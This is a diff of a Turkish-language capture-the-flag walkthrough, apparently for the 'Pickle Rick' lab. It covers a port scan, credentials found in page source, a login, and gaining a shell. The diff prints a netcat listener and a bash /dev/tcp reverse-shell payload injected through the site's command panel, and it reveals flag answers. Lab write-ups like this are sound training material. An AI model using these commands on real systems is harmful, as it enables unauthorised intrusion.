@@ -17,6 +17,7 @@ nmap <ip>                                                                   |
 HTTP 80 /open                                                               |
 SSH  80 /open                                                               |
 ============================================================================|
+ Sitenin kodlarının içinde  username buluyoruz                 |
                                                                |
 Username: R1ckRul3s => kullanıcı adı bulundu                   |
                                                                |
@@ -30,22 +31,24 @@ login.php                        |
 Kulanıcı adı : R1ckRul3s         |
 Şifre        : Wubbalubbadubdub  |
                                  |
-===============================================================================|
-ERİŞİM ELEDE ETME                                                              |
-                                                                               |
-nc -lnvp 12345 => kendi  cihazımda netcat açtım                                |
-                                                                               |
-bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1' => payloadı enjekte edtim  |
-                                                                               |
- www-data@ip**.**.**.**:/var/www/html$ => shell açılıdı                        |
-===============================================================================|
+==================================================================================|
+ERİŞİM ELEDE ETME                                                                 |
+                                                                                  |
+nc -lnvp 12345 => kendi cihazımda netcat açtım                                    |
+                                                                                  |
+Sitede panelinde bulunan command yerine payloadı yazıyorum                        |                                                                               
+                                                                                  | 
+/bin/bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1' => payloadı enjekte etim |
+                                                                                  |
+ www-data@ip**.**.**.**:/var/www/html$ => shell açılıdı                           |
+==================================================================================|
 FLAG = 1                                                                       |
                                                                                |
 Dizin ls yaptığımzıda Sup3rS3cretPickl3Ingred.txt dosyasını görüyoruz          |
                                                                                |
 cat Sup3rS3cretPickl3Ingred.txt => "mr. meeseek hair"                          |
 ==========================================================================================================|
-Clue.txt                                                                                                  |
+aynı yerde bulunan Clue.txt dosyasyında                                                                   |
                                                                                                           |
 Look around the file system for the other ingredient. => Diğer içeriklere bakmamızı söyleyen txt dosyası  |
                                                                                                           |
